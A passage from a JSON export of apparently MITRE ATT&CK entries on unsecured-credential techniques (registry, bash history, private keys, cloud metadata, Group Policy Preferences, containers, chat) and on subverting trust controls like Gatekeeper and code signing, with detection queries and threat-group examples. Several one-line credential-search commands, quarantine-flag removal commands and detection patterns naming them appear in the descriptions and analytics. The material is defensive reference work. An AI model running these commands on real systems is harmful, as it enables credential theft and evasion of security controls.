      "TrickBotcan obtain passwords stored in files from several applications such as Outlook, Filezilla, OpenSSH, OpenVPN and WinSCP.[47][48]Additionally, it searches for the \".vnc.lnk\" affix to steal VNC credentials.[49]",
      "XTunnelis capable of accessing locally stored passwords on victims.[50]"
    ]
  },
  "T1552.002": {
    "Name": "Unsecured Credentials:Credentials in Registry",
    "Description": "Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.Example commands to find Registry keys related to password information:[1]Local Machine Hive:reg query HKLM /f password /t REG_SZ /sCurrent User Hive:reg query HKCU /f password /t REG_SZ /s",
    "Detects": [
      "Monitor executed commands and arguments that may search the Registry on compromised systems for insecurely stored credentials.Analytic 1 - Commands indicating credential searches in the registry.(index=security sourcetype=\"powershell\" EventCode=4104 ScriptBlockText=\"reg query/f password /t REG_SZ /s*\")",
      "Monitor newly executed processes for applications that can be used to query the Registry, such asReg, and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.Note: Pseudocode Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). The Analytic looks for command-line instances of searching the Windows Registry for insecurely stored credentials. This can be accomplished using the query functionality of theRegsystem utility, by looking for keys and values that contain strings such as \"password\". In addition, adversaries may use toolkits such asPowerSploitin order to dump credentials from various applications such as IIS. Accordingly, this analytic looks for invocations of reg.exe in this capacity as well as that of several PowerSploit modules with similar functionality.Analytic 1 - Credentials in Files & Registry(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\")CommandLine=\"regquery HKLM /f password /t REG_SZ /s\" ORCommandLine=\"regquery HKCU /f password /t REG_SZ /s\" ORCommandLine=\"Get-UnattendedInstallFile\" ORCommandLine=\"Get-Webconfig\" ORCommandLine=\"Get-ApplicationHost\" ORCommandLine=\"Get-SiteListPassword\" ORCommandLine=\"Get-CachedGPPPassword\" ORCommandLine=\"Get-RegistryAutoLogon*\"Analytic 2 - New processes with parameters indicating credential searches.(index=security sourcetype=\"WinEventLog:Security\" EventCode=4688 CommandLine=\"reg query/f password /t REG_SZ /s\") OR(index=sysmon sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1 CommandLine=\"reg query/f password /t REG_SZ /s\")",
      "Monitor for unexpected windows registry key being accessed that may search the Registry on compromised systems for insecurely stored credentials.Analytic 1 - Unauthorized access to registry keys associated with credentials.ndex=security sourcetype=\"WinEventLog:Microsoft-Windows-Security-Auditing\" EventCode=4663 ObjectType=\"Registry\" (ObjectName=\"password\" OR ObjectName=\"credential\")| eval AccessType=case(    AccessMask=\"0x1\", \"Read\",    AccessMask=\"0x2\", \"Write\",    AccessMask=\"0x3\", \"Read/Write\",    AccessMask=\"0x4\", \"Delete\",    true(), \"Unknown\")"
    ],
    "Procedure Examples": [
      "Agent Teslahas the ability to extract credentials from the Registry.[2]",
      "APT32used Outlook Credential Dumper to harvest credentials stored in Windows registry.[3][4]",
      "IceApplecan harvest credentials from local and remote host registries.[5]",
      "PowerSploithas several modules that search the Windows Registry for stored credentials:Get-UnattendedInstallFile,Get-Webconfig,Get-ApplicationHost,Get-SiteListPassword,Get-CachedGPPPassword, andGet-RegistryAutoLogon.[1]",
      "RedCurlusedLaZagneto obtain passwords in the Registry.[6][7]",
      "Regmay be used to find credentials in the Windows Registry.[1]",
      "StrelaStealerenumerates the registry keyHKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\to identify the values for \"IMAP User,\" \"IMAP Server,\" and \"IMAP Password\" associated with the Outlook email application.[8][9][10]",
      "TrickBothas retrieved PuTTY credentials by querying theSoftware\\SimonTatham\\Putty\\Sessionsregistry key[11]",
      "Valakcan use the clientgrabber module to steal e-mail credentials from the Registry.[12]"
    ]
  },
  "T1552.003": {
    "Name": "Unsecured Credentials:Bash History",
    "Description": "Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user’s.bash_historyfile. For each user, this file resides at the same location:~/.bash_history. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials.[1]",
    "Detects": [
      "While users do typically rely on their history of commands, they often access this history through other utilities like \"history\" instead of commands likecat ~/.bash_history.Analytic 1 - Commands accessing .bash_historythrough unexpected means.(index=os sourcetype=\"linux_secure\" action=\"open\" filepath=\"/home//.bash_history\") OR(index=os sourcetype=\"macos_secure\" event_type=\"open\" file_path=\"/Users//.bash_history\")",
      "Monitoring when the user's.bash_historyis read can help alert to suspicious activity.Analytic 1 - Unauthorized access to .bash_history.(index=os sourcetype=\"linux_secure\" action=\"open\" filepath=\"/home//.bash_history\") OR(index=os sourcetype=\"macos_secure\" event_type=\"open\" file_path=\"/Users//.bash_history\") | where User NOT IN (\"root\", \"daemon\", \"bin\", \"nobody\", \"_spotlight\", \"_mbsetupuser\")| where NOT match(User, \"^[a-z]+$\")  # Filter out common service accounts"
    ],
    "Procedure Examples": [
      "Kinsinghas searchedbash_historyfor credentials.[2]"
    ]
  },
  "T1552.004": {
    "Name": "Unsecured Credentials:Private Keys",
    "Description": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.[1]Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc.Adversaries may also look in common key directories, such as~/.sshfor SSH keys on * nix-based systems orC:\\Users\\(username)\\.ssh\\on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.[2][3]When a device is registered to Entra ID, a device key and a transport key are generated and used to verify the device’s identity.[4]An adversary with access to the device may be able to export the keys in order to impersonate the device.[5]On network devices, private keys may be exported viaNetwork Device CLIcommands such ascrypto pki export.[6]Some private keys require a password or passphrase for operation, so an adversary may also useInput Capturefor keylogging or attempt toBrute Forcethe passphrase off-line. These private keys can be used to authenticate toRemote Serviceslike SSH or for use in decrypting other collected files such as email.",
    "Detects": [
      "Monitor executed commands and arguments that may search for private key certificate files on compromised systems for insecurely stored credentials.Analytic 1 - Commands indicating searches for private keys.(index=security sourcetype=\"WinEventLog:Security\" EventCode=4688 CommandLine=\"private key\" OR CommandLine=\"certificate\" OR CommandLine IN (\".key\", \".pgp\", \".gpg\", \".ppk\", \".p12\", \".pem\", \".pfx\", \".cer\", \".p7b\", \".asc\")) OR(index=sysmon sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1 CommandLine=\"private key\" OR CommandLine=\"certificate\" OR CommandLine IN (\".key\", \".pgp\", \".gpg\", \".ppk\", \".p12\", \".pem\", \".pfx\", \".cer\", \".p7b\", \".asc\")) OR(index=os sourcetype=\"linux_secure\" action=\"execve\" CommandLine=\"private key\" OR CommandLine=\"certificate\" OR CommandLine IN (\".key\", \".pgp\", \".gpg\", \".ppk\", \".p12\", \".pem\", \".pfx\", \".cer\", \".p7b\", \".asc\")) OR(index=os sourcetype=\"macos_secure\" event_type=\"execve\" CommandLine=\"private key\" OR CommandLine=\"certificate\" OR CommandLine IN (\".key\", \".pgp\", \".gpg\", \".ppk\", \".p12\", \".pem\", \".pfx\", \".cer\", \".p7b\", \".asc\"))",
      "Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity.Analytic 1 - Unauthorized access to cryptographic key files.(index=security sourcetype=\"WinEventLog:Security\" EventCode=4663 ObjectName IN (\".key\", \".pgp\", \".gpg\", \".ppk\", \".p12\", \".pem\", \".pfx\", \".cer\", \".p7b\", \".asc\", \"private key\", \"certificate\")) OR(index=sysmon sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=11 TargetObject IN (\".key\", \".pgp\", \".gpg\", \".ppk\", \".p12\", \".pem\", \".pfx\", \".cer\", \".p7b\", \".asc\", \"private key\", \"certificate\")) OR(index=os sourcetype=\"linux_secure\" action=\"open\" filepath IN (\".key\", \".pgp\", \".gpg\", \".ppk\", \".p12\", \".pem\", \".pfx\", \".cer\", \".p7b\", \".asc\", \"private key\", \"certificate\")) OR(index=os sourcetype=\"macos_secure\" event_type=\"open\" file_path IN (\".key\", \".pgp\", \".gpg\", \".ppk\", \".p12\", \".pem\", \".pfx\", \".cer\", \".p7b\", \".asc\", \"private key\", \"certificate\"))"
    ],
    "Procedure Examples": [
      "AADInternalscan gather encryption keys from Azure AD services such as ADSync and Active Directory Federated Services servers.[7]",
      "Eburyhas intercepted unencrypted private keys as well as private key pass-phrases.[8]",
      "Empirecan use modules likeInvoke-SessionGopherto extract private key and session information.[9]",
      "FoggyWebcan retrieve token signing certificates and token decryption certificates from a compromised AD FS server.[10]",
      "Hildegardhas searched for private keys in .ssh.[11]",
      "jRATcan steal keys for VPNs and cryptocurrency wallets.[12]",
      "Kinsinghas searched for private keys.[13]",
      "Machetehas scanned and looked for cryptographic keys and certificate file extensions.[14]",
      "Mafaldacan collect a Chrome encryption key used to protect browser cookies.[15]",
      "Mimikatz'sCRYPTO::Extractmodule can extract keys by interacting with Windows cryptographic application programming interface (API) functions.[16]",
      "DuringOperation Wocao, threat actors usedMimikatzto dump certificates and private keys from the Windows certificate store.[17]",
      "Rockehas used SSH private keys on the infected machine to spread its coinminer throughout a network.[18]",
      "Scattered Spiderenumerate and exfiltrate code-signing certificates from a compromised host.[19]",
      "During theSolarWinds Compromise,APT29obtained PKI keys, certificate files, and the private encryption key from an Active Directory Federation Services (AD FS) container to decrypt corresponding SAML signing certificates.[20][21]",
      "TeamTNThas searched for unsecured SSH keys.[22][23]",
      "Troll Stealercollects all data in victim.sshfolders by creating a compressed copy that is subsequently exfiltrated to command and control infrastructure.Troll Stealeralso collects key information associated with the Government Public Key Infrastructure (GPKI) service for South Korean government information systems.[24][25]",
      "Volt Typhoonhas accessed a Local State file that contains the AES key used to encrypt passwords stored in the Chrome browser.[26]"
    ]
  },
  "T1552.005": {
    "Name": "Unsecured Credentials:Cloud Instance Metadata API",
    "Description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.[1]A cloud metadata API has been used in at least one high profile compromise.[2]If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.[3]The de facto standard across cloud service providers is to host the Instance Metadata API athttp[:]//169.254.169.254.",
    "Detects": [
      "It may be possible to detect adversary use of credentials they have obtained such as inValid Accounts.Analytic 1 - Failed or unusual logon attempts using compromised credentials.index=security sourcetype=\"aws:cloudtrail\" eventName=\"ConsoleLogin\" (errorMessage=\"Failed authentication\" OR errorMessage=\"Invalid login attempt\") ORindex=security sourcetype=\"azure:activity\" operationName=\"Sign-in activity\" (status=\"Failed\" OR status=\"Error\") ORindex=security sourcetype=\"gcp:activity\" protoPayload.methodName=\"google.iam.v1.logging.GetPolicy\" (protoPayload.status.message=\"Failed\" OR protoPayload.status.message=\"Invalid login attempt\")"
    ],
    "Procedure Examples": [
      "Hildegardhas queried the Cloud Instance Metadata API for cloud credentials.[4]",
      "Peiratescan query the query AWS and GCP metadata APIs for secrets.[5]",
      "TeamTNThas queried the AWS instance metadata service for credentials.[6][7]"
    ]
  },
  "T1552.006": {
    "Name": "Unsecured Credentials:Group Policy Preferences",
    "Description": "Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.[1]These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).[2]The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:Metasploit’s post exploitation module:post/windows/gather/credentials/gppGet-GPPPassword[3]gpprefdecrypt.pyOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files:dir /s * .xml",
    "Detects": [
      "Monitor executed commands and arguments that may search for SYSVOL data and/or GPP XML files, especially on compromised domain controllers.Analytic 1 - Commands indicating searches for GPP XML files.(index=security sourcetype=\"Powershell\" EventCode=4104 CommandLine=\"dir /s.xml*\")",
      "Monitor for attempts to access SYSVOL that involve searching for XML files.Analytic 1 - Unauthorized access to SYSVOL XML files.index=security sourcetype=\"WinEventLog:Security\" EventCode=4663 ObjectName=\"SYSVOL\" ObjectName=\"*.xml\"| eval AccessType=case(    AccessMask=\"0x1\", \"Read\",    AccessMask=\"0x2\", \"Write\",    AccessMask=\"0x3\", \"Read/Write\",    AccessMask=\"0x4\", \"Delete\",    true(), \"Unknown\")"
    ],
    "Procedure Examples": [
      "APT33has used a variety of publicly available tools like Gpppassword to gather credentials.[4][5]",
      "PowerSploitcontains a collection of Exfiltration modules that can harvest credentials from Group Policy Preferences.[6][7]",
      "SILENTTRINITYhas a module that can extract cached GPP passwords.[8]",
      "Wizard Spiderhas used PowerShell cmdletsGet-GPPPasswordandFind-GPOPasswordto find unsecured credentials in a compromised network group policy.[9]"
    ]
  },
  "T1552.007": {
    "Name": "Unsecured Credentials:Container API",
    "Description": "Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.[1][2]An adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment.[3]An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components.",
    "Detects": [
      "Establish centralized logging for the activity of container and Kubernetes cluster components. Monitor logs for actions that could be taken to gather credentials to container and cloud infrastructure, including the use of discovery API calls by new or unexpected users and APIs that access Docker logs.Analytic 1 - Unexpected API calls or access to Docker logs indicating credential access.index=containers sourcetype IN (\"docker:events\", \"kubernetes:api\", \"kubernetes:container\") | search Command IN (\"docker logs\", \"kubectl get secrets\", \"kubectl describe secret\", \"kubectl exec\", \"curl http[:]//169.254.169[.]254/latest/meta-data/iam/security-credentials/\", \"aws iam list-access-keys\", \"az ad sp list\")",
      "It may be possible to detect adversary use of credentials they have obtained such as inValid Accounts.Analytic 1 - Failed or unusual logon attempts using compromised credentials.(index=containers sourcetype=\"docker:events\" action=\"create\" container_name=\"\" user!=\"root\") OR(index=containers sourcetype=\"kubernetes:api\" verb IN (\"create\", \"patch\", \"delete\") objectRef.resource IN (\"pods\", \"secrets\") user.username!=\"system:serviceaccount:\")"
    ],
    "Procedure Examples": [
      "Peiratescan query the Kubernetes API for secrets.[4]"
    ]
  },
  "T1552.008": {
    "Name": "Unsecured Credentials:Chat Messages",
    "Description": "Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.Rather than accessing the stored chat logs (i.e.,Credentials In Files), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation[1].",
    "Detects": [
      "Monitor application logs for activity that may highlight malicious attempts to access application data, especially abnormal search activity targeting passwords and other artifacts related to credentials.[3]Analytic 1 - Abnormal search activity targeting passwords and other credential artifacts.index=security sourcetype IN (\"gsuite:activity\", \"o365:audit\", \"slack:events\", \"teams:events\") (action IN (\"message_send\", \"file_upload\") AND (message_content=\"password\" OR message_content=\"token\" OR message_content=\"apikey\" OR message_content=\"credentials\" OR message_content=\"login\" OR file_name=\"password\" OR file_name=\"token\" OR file_name=\"apikey\" OR file_name=\"credentials\"))"
    ],
    "Procedure Examples": [
      "LAPSUS$has targeted various collaboration tools like Slack, Teams, JIRA, Confluence, and others to hunt for exposed credentials to support privilege escalation and lateral movement.[2]"
    ]
  },
  "T1553": {
    "Name": "Subvert Trust Controls",
    "Description": "Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conductFile and Directory Permissions ModificationorModify Registryin support of subverting these controls.[1]Adversaries may also create or steal code signing certificates to acquire trust on target systems.[2][3]",
    "Detects": [
      "Command monitoring may reveal malicious attempts to modify trust settings, such as the installation of root certificates or modifications to trust attributes/policies applied to files.",
      "Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.",
      "Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries.[1]Also analyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure \"Hide Microsoft Entries\" and \"Hide Windows Entries\" are both deselected.[1]On macOS, the removal of thecom.apple.quarantineflag by a user instead of the operating system is a suspicious action and should be examined further. Also monitor software update frameworks that may strip this flag when performing updates.",
      "Enable CryptoAPI v2 (CAPI) event logging[7]to monitor and analyze error events related to failed trust validation (Event ID 81, though this event can be subverted by hijacked trust provider components) as well as any other provided information events (ex: successful validations). Code Integrity event logging may also provide valuable indicators of malicious SIP or trust provider loads, since protected processes that attempt to load a maliciously-crafted trust validation component will likely fail (Event ID 3033).[1]",
      "Monitor processes and arguments for malicious attempts to modify trust settings, such as the installation of root certificates or modifications to trust attributes/policies applied to files.",
      "Monitoring the creation of (sub)keys within the Windows Registry may reveal malicious attempts to modify trust settings, such as the installation of root certificates. Installed root certificates are located in the Registry underHKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\and[HKLM or HKCU]\\Software[\\Policies]\\Microsoft\\SystemCertificates\\Root\\Certificates\\. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison:[8]* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85* 3B1EFD3A66EA28B16697394703A72CA340A05BD5* 7F88CD7223F3C813818C994614A89C99FA3B5247* 8F43288AD272F3103B6FB1428485EA3014C0BCFE* A43489159A520F0D93D032CCAF37E7FE20A8B419* BE36A4562FB2EE05DBB3D32323ADF445084ED656* CDD4EEAE6000AC7F40C3802C171E30148030C072",
      "Monitoring changes to the Windows Registry may reveal malicious attempts to modify trust settings, such as the installation of root certificates. Installed root certificates are located in the Registry underHKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\and[HKLM or HKCU]\\Software[\\Policies]\\Microsoft\\SystemCertificates\\Root\\Certificates\\. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison:[8]Also consider enabling the Registry Global Object Access Auditing[9]setting in the Advanced Security Audit policy to apply a global system access control list (SACL) and event auditing on modifications to Registry values (sub)keys related to SIPs and trust providers:[10]"
    ],
    "Procedure Examples": [
      "Axiomhas used digital certificates to deliver malware.[4]"
    ]
  },
  "T1553.001": {
    "Name": "Subvert Trust Controls:Gatekeeper Bypass",
    "Description": "Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple’s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.[1][2]Based on an opt-in system, when files are downloaded an extended attribute (xattr) calledcom.apple.quarantine(also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:Checks extended attribute – Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.[3][4]Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.Code Signing – Gatekeeper checks for a valid code signature from an Apple Developer ID.Notarization - Using theapi.apple-cloudkit.comAPI, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an \"unauthorized app\" and the security policy will be modified.Adversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g.Exploitation for Defense Evasion), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.[5][6]Applications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag usingDrive-by Compromise.",
    "Detects": [
      "Monitor and investigate attempts to modify extended file attributes with utilities such asxattr. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.",
      "Reviewfalsevalues under theLSFileQuarantineEnabledentry in an application'sInfo.plistfile (required by every application).falseunderLSFileQuarantineEnabledindicates that an application does not use the quarantine flag. Unsandboxed applications with an unspecifiedLSFileQuarantineEnabledentry will default to not setting the quarantine flag.QuarantineEvents is a SQLite database containing a list of all files assigned thecom.apple.quarantineattribute, located at~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2. Each event contains the corresponding UUID, timestamp, application, Gatekeeper score, and decision if it was allowed.[1]",
      "The removal of thecom.apple.quarantineflag by a user instead of the operating system is a suspicious action and should be examined further. Also monitor software update frameworks that may strip this flag when performing updates.",
      "Monitor and investigate attempts to modify extended file attributes with utilities such asxattr. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible."
    ],
    "Procedure Examples": [
      "CoinTickerdownloads the EggShell mach-o binary using curl, which does not set the quarantine flag.[7]",
      "Cuckoo Stealercan usexattr -d com.apple.quarantineto remove the quarantine flag attribute.[8][9]",
      "MacMahas removed thecom.apple.quarantineattributefrom the dropped file,$TMPDIR/airportpaird.[10]",
      "If running with elevated privileges,OSX/Shlayerhas used thespctlcommand to disable Gatekeeper protection for a downloaded file.OSX/Shlayercan also leverage system links pointing to bash scripts in the downloaded DMG file to bypass Gatekeeper, a flaw patched in macOS 11.3 and later versions.OSX/Shlayerhas been Notarized by Apple, resulting in successful passing of additional Gatekeeper checks.[11][12][13]",
      "OSX_OCEANLOTUS.Duses the commandxattr -d com.apple.quarantineto remove the quarantine file attribute used by Gatekeeper.[14][4]",
      "XCSSEThas dropped a malicious applet into an app's.../Contents/MacOS/folder of a previously launched app to bypass Gatekeeper's security checks on first launch apps (prior to macOS 13).[6]"
    ]
  },
  "T1553.002": {
    "Name": "Subvert Trust Controls:Code Signing",
    "Description": "Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.[1]The certificates used during an operation may be created, acquired, or stolen by the adversary.[2][3]UnlikeInvalid Code Signature, this activity will result in a valid signature.Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform.[1][4]Code signing certificates may be used to bypass security policies that require signed code to execute on a system.",
    "Detects": [
      "Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers."
    ],
    "Procedure Examples": [
      "Anchorhas been signed with valid certificates to evade detection by security tools.[5]",
      "AppleJeushas used a valid digital signature from Sectigo to appear legitimate.[6]",
      "APT41leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations.[7][8]",
      "APT41 DUSTused stolen code signing certificates forDUSTTRAPmalware and subsequent payloads.[9]",
      "BackConfighas been signed with self signed digital certificates mimicking a legitimate software company.[10]",
      "Bandookwas signed with valid Certum certificates.[11]",
      "Bazarhas been signed with fake certificates including those appearing to be from VB CORPORATE PTY. LTD.[12]",
      "TheBlack Bastadropper has been digitally signed with a certificate issued by Akeo Consulting for legitimate executables used for creating bootable USB drives.[13]",
      "BLINDINGCANhas been signed with code-signing certificates such as CodeRipper.[14]",
      "BOOSTWRITEhas been signed by a valid CA.[15]",
      "ForC0015, the threat actors used DLL files that had invalid certificates.[16]",
      "ChChessamples were digitally signed with a certificate originally used by Hacking Team that was later leaked and subsequently revoked.[17][18][19]",
      "CHIMNEYSWEEPhas been dropped by a self-extracting archive signed with a valid digital certificate.[20]",
      "Clopcan use code signing to evade detection.[21]",
      "Cobalt Strikecan use self signed Java applets to execute signed applet attacks.[22][23]",
      "CopyKittensdigitally signed an executable with a stolen certificate from legitimate company AI Squared.[24]",
      "CSPY Downloaderhas come signed with revoked certificates.[25]",
      "Daggerflyhas used signed, but not notarized, malicious files for execution in macOS environments.[26]",
      "Darkhotelhas used code-signing certificates on its malware that are either forged due to weak keys or stolen.Darkhotelhas also stolen certificates and signed backdoors and downloaders with them.[27][28]",
      "SomeDaserfsamples were signed with a stolen digital certificate.[29]",
      "Eburyhas installed a self-signed RPM package mimicking the original system package on RPM based systems.[30]",
      "Ecipekachas used a valid, legitimate digital signature to evade detection.[31]",
      "Turlahas used valid digital certificates from Sysprint AG to sign itsEpicdropper.[32]",
      "FIN6has used Comodo code-signing certificates.[33]",
      "FIN7has signedCarbanakpayloads with legally purchased code signing certificates.FIN7has also digitally signed their phishing documents, backdoors and other staging tools to bypass security controls.[34][35]",
      "GALLIUMhas used stolen certificates to sign its tools including those from Whizzimo LLC.[36]",
      "Gazerversions are signed with various valid certificates; one was likely faked and issued by Comodo for \"Solid Loop Ltd,\" and another was issued for \"Ultimate Computer Support Ltd.\"[37][38]",
      "GoBearuses stolen legitimate code signing certificates for defense evasion.[39][40]",
      "GreyEnergydigitally signs the malware with a code-signing certificate.[41]",
      "Helminthsamples have been signed with legitimate, compromised code signing certificates owned by software company AI Squared.[42]",
      "TheHermeticWiperexecutable has been signed with a legitimate certificate issued to Hermetica Digital Ltd.[43][44][45][46]",
      "HermeticWizardhas been signed by valid certificates assigned to Hermetica Digital.[47]",
      "Janicabused a valid AppleDeveloperID to sign the code to get past security restrictions.[48]",
      "Kimsukyhas signed files with the name EGIS CO,. Ltd. and has stolen a valid certificate that is used to sign the malware and the dropper.[49][39]",
      "Lazarus Grouphas digitally signed malware and utilities to evade detection.[50]",
      "Leviathanhas used stolen code signing certificates to sign malware.[51][52]",
      "LockerGogahas been signed with stolen certificates in order to make it look more legitimate.[53]",
      "LuminousMothhas signed their malware with a valid digital signature.[54]",
      "Lumma Stealerhas used valid code signing digital certificates from ConsolHQ LTD and Verandah Green Limited to appear legitimate.[55]",
      "MacMahas been delivered using ad hoc Apple Developer code signing certificates.[56]",
      "menuPasshas resized and added data to the certificate table to enable the signing of modified files with legitimate signatures.[31]",
      "Metamorfohas digitally signed executables using AVAST Software certificates.[57]",
      "Moleratshas used forged Microsoft code-signing certificates on malware.[58]",
      "More_eggshas used a signed binary shellcode loader and a signed Dynamic Link Library (DLL) to create a reverse shell.[33]",
      "Moses Staffhas used signed drivers from an open source tool called DiskCryptor to evade detection.[59]",
      "Nerexdrops a signed Microsoft DLL to disk.[60]",
      "OilRighas signed its malware with stolen certificates.[42]",
      "DuringOperation Dream Job,Lazarus Groupdigitally signed their own malware to evade detection.[61]",
      "DuringOperation Honeybee, the threat actors deployed the MaoCheng dropper with a stolen Adobe Systems digital signature.[62]",
      "Patchworkhas signed malware with self-signed certificates from fictitious and spoofed legitimate software companies.[10]",
      "PipeMon, its installer, and tools are signed with stolen code-signing certificates.[63]",
      "PROMETHIUMhas signed code with self-signed certificates.[64]",
      "QakBotcan use signed loaders to evade detection.[65][66]",
      "AQuasarRAT.dll file is digitally signed by a certificate from AirVPN.[67]",
      "Mustang Pandaused legitimate, signed binaries such asinkform.exeorExcelRepairToolboxLauncher.exefor follow-on execution of malicious DLLs through DLL search order hijacking inRedDelta Modified PlugX Infection Chain Operations.[68]",
      "ROADSWEEPhas been digitally signed with a certificate issued to the Kuwait Telecommunications Company KSC.[69]",
      "RTMsamples have been signed with a code-signing certificates.[70]",
      "Saint Bearhas used an initial loader malware featuring a legitimate code signing certificate associated with \"Electrum Technologies GmbH.\"[71]",
      "Scattered Spiderhas used self-signed and stolen certificates originally issued to NVIDIA and Global Software LLC.[72]",
      "Silencehas used a valid certificate to sign their primary loader Silence.Downloader (aka TrueBot).[73]",
      "During theSolarWinds Compromise,APT29was able to getSUNBURSTsigned by SolarWinds code signing certificates by injecting the malware into the SolarWinds Orion software lifecycle.[74]",
      "SpicyOmelettehas been signed with valid digital certificates.[75]",
      "StrelaStealervariants have used valid code signing certificates.[76]",
      "StrongPityhas been signed with self-signed certificates.[64]",
      "Stuxnetused a digitally signed driver with a compromised Realtek certificate.[77]",
      "Suckflyhas used stolen certificates to sign its malware.[78]",
      "SUNBURSTwas digitally signed by SolarWinds from March - May 2020.[74]",
      "SysUpdatehas been signed with stolen digital certificates.[79]",
      "TA505has signed payloads with code signing certificates from Thawte and Sectigo.[80][81][82]",
      "TrickBothas come with a signed downloader component.[5]",
